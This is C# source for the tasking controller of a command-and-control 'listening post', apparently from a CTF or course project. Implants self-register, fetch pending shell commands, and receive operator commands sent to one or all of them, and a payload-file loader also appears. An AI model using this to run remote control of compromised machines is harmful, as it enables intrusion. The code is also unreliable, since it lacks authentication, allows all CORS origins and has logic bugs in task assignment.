using JetBrains.Annotations;
using ListeningPostApiServer.Data;
using ListeningPostApiServer.Extensions;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Cors;

namespace ListeningPostApiServer.Controllers
{
    /// <inheritdoc />
    /// <summary>
    /// The tasking controller provides a mechanism by which Agents can self register themselves with
    /// the Listening Post and also retrieve assigned instructions. Implements the <see
    /// cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    /// </summary>
    /// <seealso cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    /// <remarks>This controller provides both agent access and UI access.</remarks>
    [Produces("application/json")]
    [Route("[controller]")]
    [EnableCors("AllowAll")]
    [ApiController]
    [ProducesErrorResponseType(typeof(NotFoundResult))]
    public class TaskingController : ControllerBase
    {
        #region Fields

        /// <summary>
        /// Provides an interface to the hosting environment's configuration for use by controller methods.
        /// </summary>
        private readonly IHostingEnvironment _env;

        /// <summary>
        /// Provides an interface to the implant repository implementation to controller methods.
        /// </summary>
        private readonly ImplantRepository _implantRepository;

        /// <summary>
        /// Provides an interface to the task repository implementation to controller methods.
        /// </summary>
        private readonly IRepository<TaskBase> _taskRepository;

        #endregion Fields

        #region Constructors

        /// <summary>
        /// Initializes a new instance of the <see cref="TaskingController" /> class.
        /// </summary>
        /// <param name="taskRepository">   An interface or implementation of a Task Repository.</param>
        /// <param name="implantRepository">An interface or implementation of the Agent Repository.</param>
        /// <param name="env">              An interface to the hosting environment is required.</param>
        /// <remarks>
        /// Interfaces or implementations of 2 Repositories and access to the hosting environment
        /// configuration are required and are provided by dependency injection.
        /// </remarks>
        public TaskingController(IRepository<TaskBase> taskRepository, IRepository<Implant> implantRepository, IHostingEnvironment env)
        {
            _taskRepository = taskRepository;
            _implantRepository = (ImplantRepository)implantRepository;
            _env = env;
        }

        #endregion Constructors

        #region Methods

        /// <summary>
        /// Gets the current task for the specified <see cref="Implant">implant.</see>
        /// </summary>
        //[HttpGet("/Tasking")]
        //[HttpGet("/Tasking/{id}")]
        [HttpGet("{id}")]
        public async Task<IActionResult> Get(int id)
        {
            this.Log($"Implant Checked In. Implant Id: {id}");

            var implant = await _implantRepository.GetById(id) ??
                          await RegisterImplantAsync(id);

            var task = implant.Tasks.FirstOrDefault(t => t.IsPickedUp == false);

            if (task == null)
                return new JsonResult(new { task_id = "", command = "" });

            task.IsPickedUp = true;

            await _taskRepository.SaveChangesAsync();

            return Ok(new { task_id = task.Id, command = task.Command });
        }

        // List
        /// <summary>
        /// Lists all of the tasks associated with a particular agent, or all tasks if an id is not provided.
        /// </summary>
        /// <param name="id">The agent identifier.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        [HttpGet("list/{id?}")]
        public async Task<IActionResult> ListTasks(int id)
        {
            if (id == 0)
            {
                return Ok(await _taskRepository.GetAllAsync());
            }

            var implant = await _implantRepository.GetById(id);
            if (implant == null)
            {
                return NoContent();
            }

            var results = implant.Tasks;

            return Ok(results);
        }

        // POST: tasking/
        /// <summary>
        /// Assigns a new to ask to specific agents, or all agents if an id is not specified
        /// </summary>
        /// <param name="selectedIds">An array of identifiers.</param>
        /// <param name="taskBase">   A task object.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>
        /// This controller is a bit unstable due to the specifications of this project
        /// (behavior/responses are inconsistent between agent, UI, and Postman for example.).
        /// </remarks>
        [HttpPost("{selectedIds?}")]
        public async Task<IActionResult> Post([CanBeNull] [FromRoute]int[] selectedIds, [FromBody] TaskBase taskBase)
        {
            IEnumerable<TaskBase> newTasks = new HashSet<TaskBase>();

            if (selectedIds == null || selectedIds.Length == 0)
            {
                foreach (var implant in await _implantRepository.GetAllAsync())
                    newTasks.Append(await AssignTaskAsync(implant, taskBase));
                return Ok(newTasks);
            }

            foreach (var id in selectedIds)
            {
                var implant = await _implantRepository.GetById(id);
                newTasks.Append(await AssignTaskAsync(implant, taskBase));
            }

            return Ok(newTasks);
        }

        // PUT: tasking/5
        /// <summary>
        /// Edit or Update an already existing task.
        /// </summary>
        /// <param name="taskBase">A complete task object.</param>
        /// <remarks>
        /// This method is technically implemented, but untested. I had no need of it in practice.
        /// </remarks>
        [HttpPut("{id}")]
        public async void Put([FromBody] TaskBase taskBase)
        {
            await _taskRepository.EditAsync(taskBase);

            await _taskRepository.SaveChangesAsync();
        }

        /// <summary>
        /// Helper method to assign a new task to an implant.
        /// </summary>
        /// <param name="implant">The implant.</param>
        /// <param name="task">   The task.</param>
        /// <returns>Task&lt;TaskBase&gt;.</returns>
        private async Task<TaskBase> AssignTaskAsync(Implant implant, TaskBase task)
        {
            var newTask = new TaskBase
            {
                Command = task.Command,
                Implant = implant,
                TaskType = TaskType.Command
            };

            await _taskRepository.CreateAsync(newTask);

            await _taskRepository.SaveChangesAsync();

            return task;
        }

        /// <summary>
        /// This method is no longer used, I left it here because it's complex. I used it to
        /// bootstrap hard-coded files into the database on application start. (Though not really on
        /// application start, I cheated and triggered it on every GET call to the Tasking controller.)
        /// </summary>
        /// <returns>A Task.</returns>
        [Obsolete]
        // ReSharper disable once UnusedMember.Local
        private async Task LoadFile()
        {
            const string fileName = "FlagScan.sh";
            var existingFile = await _implantRepository.Context.Set<PayloadFile>()
                .FirstOrDefaultAsync(f => f.ActualFileName == fileName);
            if (existingFile != null)
            {
                this.Log($"File: {fileName} already exists in DB");
                return;
            }

            var localFilePath = Path.Join(_env.WebRootPath, "Scripts/", fileName);
            var newFileEntity = new PayloadFile
            {
                ActualFileName = fileName,
                TempFilePath = localFilePath
            };

            this.Log($"Attempting to register local file: {localFilePath} into DB as: {newFileEntity.Guid}");

            await _implantRepository.Context.Set<PayloadFile>().AddAsync(newFileEntity);
            await _implantRepository.Context.SaveChangesAsync();
            this.Log("Success");
        }

        /// <summary>
        /// This method handles registering an agent in the database if it doesn't previously exist.
        /// Saves you from manually populating it.
        /// </summary>
        /// <param name="implantId">The implant identifier (int not Guid).</param>
        /// <returns>Task&lt;Implant&gt;.</returns>
        private async Task<Implant> RegisterImplantAsync(int implantId)
        {
            var implant = await _implantRepository.CreateAsync(new Implant
            {
                Id = implantId
            });

            await _implantRepository.SaveChangesAsync();

            return implant;
        }

        #endregion Methods

        //private async Task<Implant> GetImplantAsync(int implantId)
        //{
        //    return await ((ImplantRepository)_implantRepository).GetById(implantId);
        //}
    }
}
